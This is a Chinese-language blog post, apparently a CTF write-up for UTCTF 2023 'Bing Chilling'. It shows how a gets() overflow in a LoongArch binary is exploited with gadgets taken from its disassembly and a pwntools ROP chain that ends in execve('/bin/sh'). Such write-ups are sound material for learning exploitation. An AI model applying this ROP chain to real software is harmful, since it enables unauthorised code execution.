@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>UTCTF 2023 Bing Chilling | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="UTCTF 2023 Bing Chilling" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Loongarch ROP" />
+<meta property="og:description" content="Loongarch ROP" />
+<link rel="canonical" href="https://www.cameudis.com/2023/04/04/Bing-Chilling.html" />
+<meta property="og:url" content="https://www.cameudis.com/2023/04/04/Bing-Chilling.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-04T21:19:34+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="UTCTF 2023 Bing Chilling" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-04T21:19:34+08:00","datePublished":"2023-04-04T21:19:34+08:00","description":"Loongarch ROP","headline":"UTCTF 2023 Bing Chilling","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/04/04/Bing-Chilling.html"},"url":"https://www.cameudis.com/2023/04/04/Bing-Chilling.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">UTCTF 2023 Bing Chilling</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-04-04T21:19:34+08:00" itemprop="datePublished">Apr 4, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Loongarch ROP</p>
+
+<p>比赛时发现了这是LoongArch的ROP，由于不太会找gadget就放弃了。赛后看大佬的writeup，发现只要找到一个关键的来自_dl_runtime_resolve的gadget，就可以万事大吉了。</p>
+
+<p>复现参考：<a href="https://ctftime.org/writeup/36285">CTFtime.org / UTCTF 2023 / Bing Chilling / Writeup</a></p>
+
+<hr />
+
+<h2 id="环境准备">环境准备</h2>
+
+<p>我们都知道 Linux 下的可执行文件是 ELF 格式，但 ELF 也分架构，比如这个 binary 就是 Loongarch 龙架构。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file hello
+hello: ELF 64-bit LSB executable, <span class="k">*</span>unknown <span class="nb">arch </span>0x102<span class="k">*</span> version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 5.19.0, with debug_info, not stripped
+</code></pre></div></div>
+
+<p>可以看到其 ELF Header 中的 arch 字段值为 0x102，是一个 file 未知的架构。在网上查询 0x102，可以知道这是龙架构。为了调试这个 binary，我们需要一台龙架构真机……或者是一个龙芯模拟器。此外，我们还需要能够静态分析这个 binary 的工具，比如 objdump。</p>
+
+<p>著名的模拟器 qemu 在其 7.1.0 版本引入了对龙架构模拟的支持，因此我们安装下最新的 qemu 就行了。
+从 <a href="https://github.com/loongson/build-tools/releases/">Releases · loongson/build-tools (github.com)</a> 这里可以找到一些龙架构的交叉编译（跨架构生成 ELF）的工具，其中就包括龙架构的 objdump。
+最后，为了动态调试，可能还需要一个支持龙架构的 gdb。gdb 在 13.1 版本引入了对龙架构调试的支持，可以通过下面的指令来在 /opt/gdb 目录下编译支持龙架构的 gdb（中途遇到报错多半是缺少某个库，可以上网搜）（执行指令的位置无所谓，不过在 root 的目录下需要加很多 sudo ……）：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://ftp.gnu.org/gnu/gdb/gdb-13.1.tar.xz
+<span class="nb">tar </span>xf gdb-13.1.tar.xz
+<span class="nb">cd </span>gdb-13.1
+<span class="nb">mkdir </span>build
+<span class="nb">cd </span>build
+../configure <span class="nt">--target</span><span class="o">=</span>loongarch64-unknown-linux-gnu <span class="nt">--prefix</span><span class="o">=</span>/opt/gdb
+make
+<span class="nb">sudo </span>make <span class="nb">install</span>
+</code></pre></div></div>
+
+<p>编译得到的 gdb 位于 <code class="language-plaintext highlighter-rouge">/opt/gdb/bin/loongarch64-unknown-linux-gnu-gdb</code></p>
+
+<h2 id="程序分析">程序分析</h2>
+
+<p>学过 mips 和 riscv 的朋友会对 LoongArch 的指令集感到比较熟悉，LoongArch 也是 risc。它的寄存器昵称和 riscv 的几乎一模一样，比如存放 return address 的 ra。
+从 pwner 的视角来看，龙架构：</p>
+
+<ul>
+  <li>系统调用的参数依次存放在 <strong>a0</strong>, <strong>a1</strong>, <strong>a2</strong>, <strong>a3</strong>, <strong>a4</strong>, ……</li>
+  <li>系统调用编号存放在：<strong>a7</strong></li>
+  <li>返回地址存放在 <strong>ra</strong> 寄存器中
+  返回指令是 <code class="language-plaintext highlighter-rouge">jirl $zero, $ra, 0</code> </li>
+  <li><code class="language-plaintext highlighter-rouge">bl</code> 用作 call，先把返回地址存到 <strong>ra</strong> 然后跳转到目标地址</li>
+  <li>syscall 指令就是 <strong>syscall</strong></li>
+</ul>
+
+<p>使用 cross tool 中的 objdump 可以查看 binary 的汇编，我们直接看 main 函数：</p>
+<pre><code class="language-asm">0000000120000520 &lt;main&gt;:
+   120000520:	02fec063 	addi.d      	$sp, $sp, -80(0xfb0)
+   120000524:	29c12061 	st.d        	$ra, $sp, 72(0x48)
+   120000528:	29c10076 	st.d        	$fp, $sp, 64(0x40)
+   12000052c:	02c14076 	addi.d      	$fp, $sp, 80(0x50)
+   120000530:	1a000b0c 	pcalau12i   	$t0, 88(0x58)
+   120000534:	02e46184 	addi.d      	$a0, $t0, -1768(0x918)
+   120000538:	54bf0000 	bl          	48896(0xbf00)	# 12000c438 &lt;_IO_puts&gt;
+   12000053c:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)
+   120000540:	00150184 	move        	$a0, $t0
+   120000544:	54bb5400 	bl          	47956(0xbb54)	# 12000c098 &lt;_IO_gets&gt;
+   120000548:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)
+   12000054c:	00150185 	move        	$a1, $t0
+   120000550:	1a000b0c 	pcalau12i   	$t0, 88(0x58)
+   120000554:	02e4e184 	addi.d      	$a0, $t0, -1736(0x938)
+   120000558:	54651800 	bl          	25880(0x6518)	# 120006a70 &lt;_IO_printf&gt;
+   12000055c:	0015000c 	move        	$t0, $zero
+   120000560:	00150184 	move        	$a0, $t0
+   120000564:	28c12061 	ld.d        	$ra, $sp, 72(0x48)
+   120000568:	28c10076 	ld.d        	$fp, $sp, 64(0x40)
+   12000056c:	02c14063 	addi.d      	$sp, $sp, 80(0x50)
+   120000570:	4c000020 	jirl        	$zero, $ra, 0
+</code></pre>
+
+<p>从中可以观察到很多经典的过程调用行为，比如开始时拓展栈空间、存放返回地址等信息；结束时取回返回地址、恢复栈空间。毕竟栈这种 LIFO 的结构对于过程调用还是非常根本的。
+注意到，main 函数会依次调用 puts、<strong>gets</strong> 和 printf。有 gets 不就可以直接栈溢出了吗？
+使用 <code class="language-plaintext highlighter-rouge">qemu-loongarch64 hello</code>，然后输入一大段 A，果然 qemu 报了 segmentation fault。</p>
+
+<p>接下来的问题就是，我们已经能够控制栈了，那么 LoongArch 的栈上可以 ROP 吗？答案是可以。虽然 LoongArch 有专门用来存返回地址的 ra 寄存器，但很多过程仍然会把返回地址存到栈上，这是因为这些过程自己也需要调用其他的过程。因此，LoongArch 过程的结束既有从栈上读取返回地址，又有返回指令，可以进行 ROP。</p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>我们的目标是 get shell，但这个 hello 虽然是静态链接的，却没有 system 函数。不过，我们可以直接找到 syscall gadget：</p>
+
+<pre><code class="language-asm">   120013e4c:	002b0000 	syscall     	0x0
+   120013e50:	4c000020 	jirl        	$zero, $ra, 0
+</code></pre>
+
+<p>至于 LoongArch Linux 的 Syscall Table，我好像只在 <a href="https://patchwork.ozlabs.org/project/glibc/patch/CAKjxQHnS02h5Vo3Pm-+ESmqYqZ6FDY7ykty4KROBeondHVfmOQ@mail.gmail.com/">[6/14, LoongArch] Linux Syscall Interface - Patchwork (ozlabs. Org)</a> 有看到，其中 execve 是 221。
+只要能够控制 $a0 指向一个 “/bin/sh” 的字符串，$a1 和 $a2 控制为 0，就可以 get shell。我们需要为此找到合适的 gadget。</p>
+
+<p>从本文参考的文章那边找到了一个非常牛逼的 gadget，来自 _dl_runtime_resolve 函数：</p>
+
+<pre><code class="language-asm">   120048098:   0015008d        move            $t1, $a0
+   12004809c:   28c12061        ld.d            $ra, $sp, 72(0x48)
+   1200480a0:   28c02064        ld.d            $a0, $sp, 8(0x8)
+   1200480a4:   28c04065        ld.d            $a1, $sp, 16(0x10)
+   1200480a8:   28c06066        ld.d            $a2, $sp, 24(0x18)
+   1200480ac:   28c08067        ld.d            $a3, $sp, 32(0x20)
+   1200480b0:   28c0a068        ld.d            $a4, $sp, 40(0x28)
+   1200480b4:   28c0c069        ld.d            $a5, $sp, 48(0x30)
+   1200480b8:   28c0e06a        ld.d            $a6, $sp, 56(0x38)
+   1200480bc:   28c1006b        ld.d            $a7, $sp, 64(0x40)
+   1200480c0:   2b814060        fld.d           $fa0, $sp, 80(0x50)
+   1200480c4:   2b816061        fld.d           $fa1, $sp, 88(0x58)
+   1200480c8:   2b818062        fld.d           $fa2, $sp, 96(0x60)
+   1200480cc:   2b81a063        fld.d           $fa3, $sp, 104(0x68)
+   1200480d0:   2b81c064        fld.d           $fa4, $sp, 112(0x70)
+   1200480d4:   2b81e065        fld.d           $fa5, $sp, 120(0x78)
+   1200480d8:   2b820066        fld.d           $fa6, $sp, 128(0x80)
+   1200480dc:   2b822067        fld.d           $fa7, $sp, 136(0x88)
+   1200480e0:   02c24063        addi.d          $sp, $sp, 144(0x90)
+   1200480e4:   4c0001a0        jirl            $zero, $t1, 0
+</code></pre>
+
+<p>似乎不管在哪个架构中，_dl_runtime_resolve 函数的功能都是保存寄存器的值到栈中，然后调用_dl_fixup执行具体的功能，然后从栈中恢复寄存器。因此以后要是遇到了什么riscv pwn，也可以使用这个gadget。
+这个 gadget 能够控制所有参数寄存器，但需要提前把返回地址存在 $a0 中。所以继续手工找 gadget：</p>
+
+<pre><code class="language-asm">   12000bc54:   28c0a061        ld.d            $ra, $sp, 40(0x28)
+   12000bc58:   28c08077        ld.d            $s0, $sp, 32(0x20)
+   12000bc5c:   28c04079        ld.d            $s2, $sp, 16(0x10)
+   12000bc60:   28c0207a        ld.d            $s3, $sp, 8(0x8)
+   12000bc64:   00150304        move            $a0, $s1
+   12000bc68:   28c06078        ld.d            $s1, $sp, 24(0x18)
+   12000bc6c:   02c0c063        addi.d          $sp, $sp, 48(0x30)
+   12000bc70:   4c000020        jirl            $zero, $ra, 0
+</code></pre>
+
+<p>这个 gadget 可以把 $s1 移到 $a0 ，那就继续找可以改 $s1 的 gadget：</p>
+
+<pre><code class="language-asm">   12000be90:   28c06061        ld.d            $ra, $sp, 24(0x18)
+   12000be94:   0012e004        sltu            $a0, $zero, $s1
+   12000be98:   28c04077        ld.d            $s0, $sp, 16(0x10)
+   12000be9c:   28c02078        ld.d            $s1, $sp, 8(0x8)
+   12000bea0:   00119004        sub.d           $a0, $zero, $a0
+   12000bea4:   02c08063        addi.d          $sp, $sp, 32(0x20)
+   12000bea8:   4c000020        jirl            $zero, $ra, 0
+</code></pre>
+
+<p>有了这三个 gadget，齐活了！我们拥有了执行任意函数、任意 syscall 的能力。
+接下来就是 exp 了，思路是首先把 “/bin/sh”读入到已知地址（程序关闭了 PIE），比如 bss 段，然后用 syscall gadget 来 get shell。前者我们可以通过 return to gets 来实现。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">g1</span> <span class="o">=</span> <span class="mh">0x12000bc54</span>
+<span class="n">g2</span> <span class="o">=</span> <span class="mh">0x12000be90</span>
+<span class="n">g3</span> <span class="o">=</span> <span class="mh">0x120048098</span>
+<span class="n">sys</span> <span class="o">=</span> <span class="mh">0x120013e4c</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x120087000</span>
+<span class="n">gets_addr</span> <span class="o">=</span> <span class="mh">0x12000c098</span>
+
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">g2</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="n">gets_addr</span><span class="p">,</span> <span class="mi">0</span>
+    <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">g1</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">g3</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">g2</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="mi">0</span>
+    <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">g1</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">g3</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span>
+        <span class="n">g2</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">])</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+    
+      <b>本博客上与 pwn 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/07/24/CISCN-Final-2024.html">CISCN Final 2024</a></li>
+        
+          <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+        
+          <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+        
+          <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+    
+      <b>本博客上与 loongarch 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+    
+      <b>本博客上与 rop 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2023/04/04/Bing-Chilling.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
